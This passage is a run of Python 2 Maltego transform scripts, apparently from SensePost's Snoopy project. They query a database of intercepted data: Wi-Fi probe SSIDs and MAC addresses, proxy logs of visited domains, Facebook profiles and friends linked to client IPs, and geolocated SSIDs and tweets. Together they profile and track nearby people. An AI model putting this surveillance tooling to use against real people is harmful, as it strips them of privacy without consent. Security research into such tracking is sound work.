                now=now.strftime("%Y-%m-%d %H:%M:%S.0")
                start_time=start_time.strftime("%Y-%m-%d %H:%M:%S.0")
                end_time=end_time.strftime("%Y-%m-%d %H:%M:%S.0")


        if 'location' in m.AdditionalFields:               
		location=m.AdditionalFields['location']
	else:  
                location="%"	

	if 'properties.drone' in m.AdditionalFields:
		drone=m.AdditionalFields['properties.drone']

	ua='None'
	if 'useragent' in m.AdditionalFields:
		ua=m.AdditionalFields['useragent']


	cursor.execute("SELECT DISTINCT client_ip,hostname,dhcp_leases.mac,vendor_short,ua FROM dhcp_leases,squid_logs,mac_vendor WHERE squid_logs.client_ip=dhcp_leases.ip AND dhcp_leases.mac_prefix=mac_vendor.mac AND ua LIKE %s",(ua))
	results=cursor.fetchall()

	for row in results:

		try:
			client_ip=row[0]
			hostname=row[1].encode('utf8','xmlcharrefreplace')
			mac=row[2]
			vendor=row[3].encode('utf8','xmlcharrefreplace')
			ua=row[4].encode('utf8','xmlcharrefreplace')
		except Exception,e:
			logging.debug(e)

        	NewEnt=TRX.addEntity("snoopy.Client", "%s (%s)"%(vendor,hostname))
		NewEnt.addAdditionalFields("hostname","hostname","strict",hostname)
		NewEnt.addAdditionalFields("mac","mac","strict",mac)
		NewEnt.addAdditionalFields("vendor","vendor","strict",vendor)
#		NewEnt.addAdditionalFields("useragent","useragent","strict",ua)

		NewEnt.addAdditionalFields("from_web","from_web","strict","True")
		NewEnt.addAdditionalFields("from_probes","from_probes","strict","True")

		#NewEnt.addAdditionalFields("drone","drone","strict",drone)
                #NewEnt.addAdditionalFields("start_time", "start_time", "nostrict",start)
                #NewEnt.addAdditionalFields("end_time","end_time", "nostrict",end)
                #NewEnt.addAdditionalFields("location","location","strict",location)
		#NewEnt.addAdditionalFields("run_id","run_id","strict",run_id)


        TRX.returnOutput()
try:    
	main()
except Exception, e:
	logging.debug(e)
                

########NEW FILE########
__FILENAME__ = fetchCountries
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime
from common import *

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
    	#logging.debug(MaltegoXML_in)
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

	drone='%'
	now=datetime.datetime.now()
        if 'start_time' in m.AdditionalFields and 'end_time' in m.AdditionalFields :
                start_time=m.AdditionalFields['start_time']
                end_time=m.AdditionalFields['end_time']
        else:  
                start_time=now+datetime.timedelta(seconds=-lookback)
                end_time=now+datetime.timedelta(seconds=lookback)

                # Maltego requires format e.g 2012-10-23 22:37:12.0
                now=now.strftime("%Y-%m-%d %H:%M:%S.0")
                start_time=start_time.strftime("%Y-%m-%d %H:%M:%S.0")
                end_time=end_time.strftime("%Y-%m-%d %H:%M:%S.0")


        if 'location' in m.AdditionalFields:               
		location=m.AdditionalFields['location']
	else:  
                location="%"	

	if 'properties.drone' in m.AdditionalFields:
		drone=m.AdditionalFields['properties.drone']


	cursor.execute("SELECT country,count(*) FROM wigle GROUP BY country HAVING country != ''")
	results=cursor.fetchall()

	for row in results:
		country="fuck unicode"
		num=-1
		try:
			#country=row[0].decode('raw_unicode_escape').encode('ascii','xmlcharrefreplace')
			country=row[0].encode('utf8','xmlcharrefreplace')
			num=row[1]
		except Exception,e:
			logging.debug(e)
		

        	NewEnt=TRX.addEntity("maltego.Location", country);
		NewEnt.addAdditionalFields("num","Number","strict",num)
		NewEnt.addAdditionalFields("country","country","strict",country)
		NewEnt.setWeight(num)

		#NewEnt.addAdditionalFields("drone","drone","strict",drone)
                #NewEnt.addAdditionalFields("start_time", "start_time", "nostrict",start)
                #NewEnt.addAdditionalFields("end_time","end_time", "nostrict",end)
                #NewEnt.addAdditionalFields("location","location","strict",location)
		#NewEnt.addAdditionalFields("run_id","run_id","strict",run_id)


        TRX.returnOutput()
try:    
	main()
except Exception, e:
	logging.debug(e)
                

########NEW FILE########
__FILENAME__ = fetchDomains
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime
from common import *

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()


	try:

	#	logging.debug(m.AdditionalFields['end_time'])
	        now=datetime.datetime.now()
	        if 'start_time' in m.AdditionalFields and 'end_time' in m.AdditionalFields :
	                start_time=m.AdditionalFields['start_time']
	                end_time=m.AdditionalFields['end_time']
	        else:   
	                start_time=now-datetime.timedelta(0,lookback)
	                end_time=now+datetime.timedelta(1,0)
		
		logging.debug(start_time)
		logging.debug(end_time)
	
		if 'mac' in m.AdditionalFields:
			mac=m.AdditionalFields['mac']
		else:
			mac="0"
		if 'drone' in m.AdditionalFields:
			drone=m.AdditionalFields['drone']
		else:
			drone="0"

		logging.debug(mac)
		logging.debug(drone)
	
		cursor.execute("SELECT DISTINCT domain FROM snoopy_web_logs WHERE mac=%s", (mac))
		#cursor.execute("SELECT DISTINCT domain FROM snoopy_web_logs WHERE mac=%s AND timestamp > %s AND timestamp <%s", (mac,start_time,end_time))
		results=cursor.fetchall()


		for row in results:
			domain=row[0]
			if ( domain == "facebook.com" ):
				NewEnt=TRX.addEntity("maltego.FacebookObject",domain)
				
			else:
        			NewEnt=TRX.addEntity("Domain", domain)

			NewEnt.addAdditionalFields("start_time", "start_time", "nostrict",start_time)
                        NewEnt.addAdditionalFields("end_time","end_time", "nostrict",end_time)
			NewEnt.addAdditionalFields("mac","mac","strict",mac)
			NewEnt.addAdditionalFields("drone","drone","strict",drone)
#			NewEnt.addAdditionalFields("drone","drone","strict",drone)
#			NewEnt.addAdditionalFields("mac","mac","strict",mac)

        except Exception, e:
                logging.debug("Exception:")
                logging.debug(e)


        TRX.returnOutput()
    
main()
                

########NEW FILE########
__FILENAME__ = fetchDrones
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime
from time import strftime
import re
from common import *
logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

	# If no start / end times are specified, we default to lookback 
	now=datetime.datetime.now()
	if 'start_time' in m.AdditionalFields and 'end_time' in m.AdditionalFields :
		start_time=m.AdditionalFields['start_time']
		end_time=m.AdditionalFields['end_time']
	else:
		start_time=now+datetime.timedelta(seconds=-lookback)
		end_time=now+datetime.timedelta(seconds=lookback)

		# Maltego requires format e.g 2012-10-23 22:37:12.0
		now=now.strftime("%Y-%m-%d %H:%M:%S.0")
		start_time=start_time.strftime("%Y-%m-%d %H:%M:%S.0")
		end_time=end_time.strftime("%Y-%m-%d %H:%M:%S.0")

	if 'location' in m.AdditionalFields:
		location=m.AdditionalFields['location']
	else:
		location="%"


	logging.debug("-----------------")

	logging.debug("1. Currenttime -%s, Start time - %s, End time - %s" %(now,start_time,end_time))
	try:
	
		logging.debug("select DISTINCT drone_conf.id from dhcp_leases inner join mac_vendor on mac_prefix=mac_vendor.mac inner join squid_logs on client_ip=dhcp_leases.ip inner join drone_conf on drone_conf.ip_prefix=dhcp_leases.ip_prefix WHERE squid_logs.timestamp > %s AND squid_logs.timestamp < %s UNION SELECT DISTINCT monitor_id FROM probes WHERE timestamp > %s AND timestamp < %s AND location LIKE %s" % (start_time,end_time,start_time,end_time,location))
		cursor.execute("select DISTINCT drone_conf.id from dhcp_leases inner join mac_vendor on mac_prefix=mac_vendor.mac inner join squid_logs on client_ip=dhcp_leases.ip inner join drone_conf on drone_conf.ip_prefix=dhcp_leases.ip_prefix WHERE squid_logs.timestamp > %s AND squid_logs.timestamp < %s UNION SELECT DISTINCT monitor_id FROM probes WHERE timestamp > %s AND timestamp < %s AND location LIKE %s", (start_time,end_time,start_time,end_time,location))

#		cursor.execute("select DISTINCT drone_conf.id from dhcp_leases inner join mac_vendor on mac_prefix=mac_vendor.mac inner join squid_logs on client_ip=dhcp_leases.ip inner join drone_conf on drone_conf.ip_prefix=dhcp_leases.ip_prefix WHERE squid_logs.timestamp > %s AND squid_logs.timestamp < %s UNION SELECT DISTINCT monitor_id FROM proximity_sessions WHERE last_probe > %s AND last_probe < %s AND location LIKE %s", (start_time,end_time,start_time,end_time,location))
		results=cursor.fetchall()

		logging.debug("Observed drone count: %d" %len(results))
			
		for row in results:
			logging.debug("2. Currenttime -%s, Start time - %s, End time - %s" %(now,start_time,end_time))
	        	drone=row[0]
	        	NewEnt=TRX.addEntity("snoopy.Drone", row[0]);
			NewEnt.addAdditionalFields("drone","drone", "strict", row[0])
			NewEnt.addAdditionalFields("start_time","Start time", "nostrict", start_time)
			NewEnt.addAdditionalFields("end_time","End time", "nostrict", end_time)
#			NewEnt.addAdditionalFields("location","location", "strict", location)

			NewEnt.addAdditionalFields("start_time_txt","Start time_txt", "nostrict", start_time)
                        NewEnt.addAdditionalFields("end_time_txt","End time_txt", "nostrict", end_time)


			NewEnt.addAdditionalFields("current_time","current_time","nostrict",now)


	except Exception, e:
		logging.debug("Exception:")
		logging.debug(e)


        TRX.returnOutput()
    
main()
                

########NEW FILE########
__FILENAME__ = fetchFacebook
#!/usr/bin/python
import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    fb_view_url=None
    try:
                p=os.path.dirname(os.path.realpath(__file__))
                f=open("%s/../setup/webroot_guid.txt"%p,"r")
                fb_view_url=f.readline().strip() + "/web_data/facebook/"
    except:
                logging.debug("Warning: Couldn't determind streetview webserver folder")



    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()


	try:

		mac=m.AdditionalFields['mac']
		drone=m.AdditionalFields['drone']

		logging.debug(mac)
		logging.debug(drone)

		logging.debug("SELECT id,name,gender,locale,network,link,degree FROM facebook,dhcp_leases WHERE facebook.ip=dhcp_leases.ip AND mac=%s"%(mac))

		cursor.execute("SELECT id,name,gender,locale,network,link,degree FROM facebook,dhcp_leases WHERE facebook.ip=dhcp_leases.ip AND mac=%s",(mac))
		results=cursor.fetchall()

		for row in results:
			id,name,gender,locale,network,link,degree=row[0],row[1],row[2],row[3],row[4],row[5],row[6]

                        if id != None:
                                id=id.encode('utf8','xmlcharrefreplace')
                        if name != None:
                                name=name.encode('utf8','xmlcharrefreplace')
                        if gender != None:
                                gender=gender.encode('utf8','xmlcharrefreplace')
                        if locale != None:
                                locale=locale.encode('utf8','xmlcharrefreplace')
                        if network != None:
                                network=network.encode('utf8','xmlcharrefreplace')
                        else:  
                                network="-"
                        if link != None:
                                link=link.encode('utf8','xmlcharrefreplace')

			NewEnt=TRX.addEntity("maltego.FacebookObject",name)
			NewEnt.addAdditionalFields("id","id","nostrict",id)
			NewEnt.addAdditionalFields("gender","gender","nostrict",gender)
			NewEnt.addAdditionalFields("locale","locale","nostrict",locale)
			NewEnt.addAdditionalFields("network","network","nostrict",network)
			NewEnt.addAdditionalFields("link","link","nostrict",link)
			NewEnt.addAdditionalFields("degree","degree","nostrict",degree)

			NewEnt.addAdditionalFields("drone","drone","nostrict",drone)
			NewEnt.addAdditionalFields("mac","mac","nostrict",mac)

			logging.debug("Facebook profile photo - %s/%s/profile.jpg" % (fb_view_url,id))
			if( fb_view_url != None):
                                NewEnt.addAdditionalFields("facebook_profile_photo","Profile","strict","%s/%s/profile.jpg"%(fb_view_url,id))
                                NewEnt.setIconURL("%s/%s/profile.jpg" % (fb_view_url,id))




        except Exception, e:
                logging.debug("Exception:")
                logging.debug(e)


        TRX.returnOutput()
    
main()
                

########NEW FILE########
__FILENAME__ = fetchFacebookFriends
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    fb_view_url=None
    try:
                p=os.path.dirname(os.path.realpath(__file__))
                f=open("%s/../setup/webroot_guid.txt"%p,"r")
                fb_view_url=f.readline().strip() + "/web_data/facebook/"
    except:
                logging.debug("Warning: Couldn't determind streetview webserver folder")


    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()


	try:	
		mac,drone=0,0
		if 'mac' in m.AdditionalFields:
			mac=m.AdditionalFields['mac']
		if 'drone' in m.AdditionalFields:
			drone=m.AdditionalFields['drone']
		
		id=m.AdditionalFields['id']		

		logging.debug(mac)
		logging.debug(drone)
		logging.debug(id)
		logging.debug("SELECT facebook.id,name,gender,locale,network,link,degree FROM facebook_friends,facebook WHERE facebook_friends.id='%s' AND facebook_friends.friend_id=facebook.id"% (id))	

		cursor.execute("SELECT facebook.id,name,gender,locale,network,link,degree FROM facebook_friends,facebook WHERE facebook_friends.id=%s AND facebook_friends.friend_id=facebook.id", (id))
		results=cursor.fetchall()


		for row in results:
			id,name,gender,locale,network,link,degree=row[0],row[1],row[2],row[3],row[4],row[5],row[6]

			if id != None:		
				id=id.encode('utf8','xmlcharrefreplace')
			if name != None:
				name=name.encode('utf8','xmlcharrefreplace')
			if gender != None:
				gender=gender.encode('utf8','xmlcharrefreplace')
			if locale != None:
				locale=locale.encode('utf8','xmlcharrefreplace')
			if network != None:
				network=network.encode('utf8','xmlcharrefreplace')
			else:
				network="-"
			if link != None:
				link=link.encode('utf8','xmlcharrefreplace')
			

			NewEnt=TRX.addEntity("maltego.FacebookObject",name)
			NewEnt.addAdditionalFields("id","id","nostrict",id)
			NewEnt.addAdditionalFields("gender","gender","nostrict",gender)
			NewEnt.addAdditionalFields("locale","locale","nostrict",locale)
#			NewEnt.addAdditionalFields("network","network","nostrict",network)
			NewEnt.addAdditionalFields("link","link","nostrict",link)
			NewEnt.addAdditionalFields("degree","degree","nostrict",degree)

#			NewEnt.addAdditionalFields("drone","drone","nostrict",drone)
#			NewEnt.addAdditionalFields("mac","mac","nostrict",mac)

                        #logging.debug("Facebook profile photo - %s/%s/profile.jpg" % (fb_view_url,id))
                        if( fb_view_url != None):
                                NewEnt.addAdditionalFields("facebook_profile_photo","Profile","strict","%s/%s/profile.jpg"%(fb_view_url,id))
                                NewEnt.setIconURL("%s/%s/profile.jpg" % (fb_view_url,id))


        except Exception, e:
                logging.debug("Exception:")
                logging.debug(e)


        TRX.returnOutput()
    
main()
                

########NEW FILE########
__FILENAME__ = fetchLocations
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime
from common import *

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():
    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
    	#logging.debug(MaltegoXML_in)
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

	drone='%'
	now=datetime.datetime.now()
        if 'start_time' in m.AdditionalFields and 'end_time' in m.AdditionalFields :
                start_time=m.AdditionalFields['start_time']
                end_time=m.AdditionalFields['end_time']
        else:  
                start_time=now+datetime.timedelta(seconds=-lookback)
                end_time=now+datetime.timedelta(seconds=lookback)

                # Maltego requires format e.g 2012-10-23 22:37:12.0
                now=now.strftime("%Y-%m-%d %H:%M:%S.0")
                start_time=start_time.strftime("%Y-%m-%d %H:%M:%S.0")
                end_time=end_time.strftime("%Y-%m-%d %H:%M:%S.0")


        if 'location' in m.AdditionalFields:               
		location=m.AdditionalFields['location']
	else:  
                location="%"	

	if 'properties.drone' in m.AdditionalFields:
		drone=m.AdditionalFields['properties.drone']

#	logging.debug("SELECT DISTINCT location FROM probes WHERE timestamp > '%s' AND timestamp < '%s' AND monitor_id LIKE '%s'" %(start_time,end_time,drone))
#	cursor.execute("SELECT DISTINCT location FROM probes WHERE timestamp > %s AND timestamp < %s AND monitor_id LIKE %s", (start_time,end_time,drone))

	logging.debug("SELECT location,MIN(timestamp),MAX(timestamp),run_id FROM probes WHERE timestamp > '%s' AND timestamp < '%s' AND monitor_id LIKE '%s' GROUP BY location"% (start_time,end_time,drone))	
	cursor.execute("SELECT location,MIN(timestamp),MAX(timestamp),run_id FROM probes WHERE timestamp > %s AND timestamp < %s AND monitor_id LIKE %s GROUP BY location", (start_time,end_time,drone))


	results=cursor.fetchall()

	for row in results:
		location,start,end,run_id=row[0],row[1].strftime("%Y-%m-%d %H:%M:%S.0"),row[2].strftime("%Y-%m-%d %H:%M:%S.0"),row[3]
		logging.debug("SE / ET - %s / %s" %(start,end))
        	NewEnt=TRX.addEntity("snoopy.DroneLocation", location);

		NewEnt.addAdditionalFields("drone","drone","strict",drone)
                NewEnt.addAdditionalFields("start_time", "start_time", "nostrict",start)
                NewEnt.addAdditionalFields("end_time","end_time", "nostrict",end)
                NewEnt.addAdditionalFields("location","location","strict",location)
		NewEnt.addAdditionalFields("run_id","run_id","strict",run_id)


        TRX.returnOutput()
try:    
	main()
except Exception, e:
	logging.debug(e)
                

########NEW FILE########
__FILENAME__ = fetchSSIDLocations
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
from wigle_api_lite import fetchLocations
import time
from xml.sax.saxutils import escape

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout
def main():

    street_view_url=None
    try:
		p=os.path.dirname(os.path.realpath(__file__))
		f=open("%s/../setup/webroot_guid.txt"%p,"r")
		street_view_url=f.readline().strip() + "/web_data/street_views/"
    except:
		logging.debug("Warning: Couldn't determind streetview webserver folder")



    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
        m = MaltegoMsg(MaltegoXML_in)

	logging.debug(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

	ssid=m.Value

	try:
		cursor.execute("SELECT gps_lat,gps_long,country,code,address FROM wigle WHERE overflow = 0 AND ssid=%s LIMIT 500",(ssid)) #Can be useful to LIMIT 5, or some such. Make sure to do the same in fetchClientsFromCountry.py
		#cursor.execute("SELECT gps_lat,gps_long,country,code,address FROM wigle WHERE overflow = 0 AND ssid=%s",(ssid))
		results=cursor.fetchall()	
		for row in results:
			# How to Unicode, plox?
			lat=row[0]
			long=row[1]
#			country=row[2].decode('raw_unicode_escape').encode('ascii','xmlcharrefreplace')
#			code=row[3].decode('raw_unicode_escape').encode('ascii','xmlcharrefreplace')
#			address=row[4].decode('utf-8').encode('ascii','xmlcharrefreplace')
			country=row[2].encode('utf8','xmlcharrefreplace')
			code=row[3].encode('utf8','xmlcharrefreplace')
			address=row[4].encode('utf8','xmlcharrefreplace')

			#NewEnt=TRX.addEntity("snoopy.ssidLocation",country)
			NewEnt=TRX.addEntity("maltego.Location",country)
			NewEnt.addAdditionalFields("latitude","latitude","strict",lat)
			NewEnt.addAdditionalFields("longitude","longitude","strict",long)
			NewEnt.addAdditionalFields("country", "Country", "strict", country)
		        NewEnt.addAdditionalFields("countrycode", "Country Code", "strict", code)
#	       		NewEnt.addAdditionalFields("streetaddress", "Street Address", "strict", "<![CDATA[" + address + "]]>")
			NewEnt.addAdditionalFields("streetaddress", "Street Address", "strict", address)
			NewEnt.addAdditionalFields("googleMap", "Google map", "nostrict", escape("http://maps.google.com/maps?t=h&q=%s,%s"%(lat,long)))
	
			logging.debug(street_view_url)	
			if( street_view_url != None):
				NewEnt.addAdditionalFields("streetview","streetview","strict","%s/%s,%s.jpg"%(street_view_url,lat,long))	
				NewEnt.setIconURL("%s/%s,%s.jpg" % (street_view_url,lat,long))


	except Exception,e:
		logging.debug(e)


	logging.debug(TRX)
        TRX.returnOutput()
   

def debug1(self):
        print "<MaltegoMessage>";
        print "<MaltegoTransformResponseMessage>";

        print "<Entities>"
        for i in range(len(self.entities)):
                self.entities[i].returnEntity();
        print "</Entities>"

        print "<UIMessages>"
        for i in range(len(self.UIMessages)):
                print "<UIMessage MessageType=\"" + self.UIMessages[i][0] + "\">" + self.UIMessages[i][1] + "</UIMessage>";
        print "</UIMessages>"

        print "</MaltegoTransformResponseMessage>";
        print "</MaltegoMessage>";


 
main()
                

########NEW FILE########
__FILENAME__ = fetchSSIDs
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime
from xml.sax.saxutils import escape

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

	#logging.debug(MaltegoXML_in)
	try:
		mac,drone='%','%'
		if 'mac' in m.AdditionalFields:
			mac=m.AdditionalFields['mac']
		if 'drone' in m.AdditionalFields:
			drone=m.AdditionalFields['drone']

		logging.debug(mac)
		logging.debug(drone)
#		cursor.execute("SELECT DISTINCT probe_ssid FROM probes WHERE probe_ssid NOT LIKE '%\\\\\\%' AND  device_mac=%s", (mac))
		cursor.execute("SELECT DISTINCT probe_ssid FROM probes WHERE device_mac=%s", (mac))
		results=cursor.fetchall()


		for row in results:
       		 	ssid=escape(row[0])
			#ssid=(row[0]).encode('ascii','xmlcharrefreplace')
			if ssid != '':
				logging.debug(ssid)
        			NewEnt=TRX.addEntity("snoopy.SSID", ssid);
			
#			NewEnt.addAdditionalFields("start_time","Start time", "strict", start_time)
#			NewEnt.addAdditionalFields("end_time","End time", "strict", end_time)

        except Exception, e:
                logging.debug("Exception:")
                logging.debug(e)


        TRX.returnOutput()

try:    
	main()
except Exception, e:
	logging.debug("Exception:")
	logging.debug(e)                

########NEW FILE########
__FILENAME__ = fetchTweetsByLocation
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

from Maltego import *
import logging
import requests
import json
import stawk_db
import re

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

	try:
		logging.debug("Here we go")
		for item in m.TransformSettings.keys():
       		 	logging.debug("N:"+item+" V:"+m.TransformSettings[item])
	
#		logging.debug(MaltegoXML_in)

		radius="5" #miles
		lat=m.AdditionalFields['lat']
		lng=m.AdditionalFields['long']
		if 'radius' in m.AdditionalFields:
			radius=m.AdditionalFields

		logging.debug("Tweep cords to search - %s,%s (%s miles)" %(lat,lng,radius))
	
		r=requests.get("https://search.twitter.com/search.json?q=geocode:%s,%s,%smi"%(lat,lng,radius))
		tw=json.loads(r.text)
		
		logging.debug("Tweep results - %d"%len(tw['results']))
		for tweep in tw['results']:
				name=tweep['from_user_name'].encode('utf8','xmlcharrefreplace')
				username=tweep['from_user'].encode('utf8','xmlcharrefreplace')
				uid=tweep['from_user_id_str'].encode('utf8','xmlcharrefreplace')
				recent_tweet=tweep['text'].encode('utf8','xmlcharrefreplace')
				img=tweep['profile_image_url'].encode('utf8','xmlcharrefreplace')				
				profile_page="http://twitter.com/%s"%username
				largephoto=re.sub('_normal','',img)


        			NewEnt=TRX.addEntity("maltego.affiliation.Twitter", name)
				NewEnt.addAdditionalFields("uid","UID","strict",uid)
				NewEnt.addAdditionalFields("affiliation.profile-url","Profile URL","strict",profile_page)
				NewEnt.addAdditionalFields("twitter.screen-name","Screen Name","strict",username)
				NewEnt.addAdditionalFields("person.fullname","Real Name","strict",name)
				NewEnt.addAdditionalFields("photo","Photo","nostrict",largephoto)
				NewEnt.addAdditionalFields("tweet","Recent Tweet","nostrict",recent_tweet)
				NewEnt.setIconURL(img)			

        except Exception, e:
                logging.debug("Exception:")
                logging.debug(e)


        TRX.returnOutput()
    
main()
                

########NEW FILE########
__FILENAME__ = fetchUAsFromClient
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()


	try:
		if 'mac' in m.AdditionalFields:
			mac=m.AdditionalFields['mac']

		logging.debug(mac)
	
		cursor.execute("SELECT DISTINCT ua FROM squid_logs,dhcp_leases WHERE squid_logs.client_ip=dhcp_leases.ip AND dhcp_leases.mac=%s", (mac))
		results=cursor.fetchall()


		for row in results:
       		 	ua=row[0].encode('utf8','xmlcharrefreplace')
        		NewEnt=TRX.addEntity("snoopy.useragent", ua);
			
#			NewEnt.addAdditionalFields("start_time","Start time", "strict", start_time)
#			NewEnt.addAdditionalFields("end_time","End time", "strict", end_time)

        except Exception, e:
                logging.debug("Exception:")
                logging.debug(e)


        TRX.returnOutput()
    
main()
                

########NEW FILE########
__FILENAME__ = fetchUserAgents
#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime
from common import *

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
    	#logging.debug(MaltegoXML_in)
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

	drone='%'
	now=datetime.datetime.now()
        if 'start_time' in m.AdditionalFields and 'end_time' in m.AdditionalFields :
                start_time=m.AdditionalFields['start_time']
                end_time=m.AdditionalFields['end_time']
        else:  
                start_time=now+datetime.timedelta(seconds=-lookback)
                end_time=now+datetime.timedelta(seconds=lookback)

                # Maltego requires format e.g 2012-10-23 22:37:12.0
                now=now.strftime("%Y-%m-%d %H:%M:%S.0")
                start_time=start_time.strftime("%Y-%m-%d %H:%M:%S.0")
                end_time=end_time.strftime("%Y-%m-%d %H:%M:%S.0")


        if 'location' in m.AdditionalFields:               
		location=m.AdditionalFields['location']
	else:  
                location="%"	

	if 'properties.drone' in m.AdditionalFields:
		drone=m.AdditionalFields['properties.drone']


	cursor.execute("SELECT ua, COUNT(*) FROM (SELECT ua, client_ip FROM squid_logs GROUP BY ua, client_ip) AS x GROUP BY ua")
	results=cursor.fetchall()

	for row in results:
		num=-1
		ua="fuck unicode"
		try:
			ua=row[0].encode('utf8','xmlcharrefreplace')
			num=row[1]
		except Exception,e:
			logging.debug(e)

        	NewEnt=TRX.addEntity("snoopy.useragent", ua);
		NewEnt.addAdditionalFields("num","Number","strict",num)
		NewEnt.addAdditionalFields("useragent","useragent","strict",ua)
		NewEnt.setWeight(num)

		#NewEnt.addAdditionalFields("drone","drone","strict",drone)
                #NewEnt.addAdditionalFields("start_time", "start_time", "nostrict",start)
